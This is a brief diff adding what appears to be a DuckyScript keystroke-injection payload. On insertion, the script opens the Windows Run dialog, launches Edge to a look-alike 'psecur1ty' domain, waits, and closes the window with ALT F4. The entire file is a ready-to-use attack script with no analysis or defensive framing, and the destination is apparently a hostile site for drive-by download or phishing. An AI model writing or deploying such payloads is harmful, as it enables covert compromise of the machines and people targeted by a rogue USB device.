@@ -1,0 +1,9 @@
+DELAY 5000
+GUI r
+DELAY 200
+STRING msedge https://psecur1ty.cf/
+ENTER
+DELAY 3000
+ALT F4
+ENTER
+
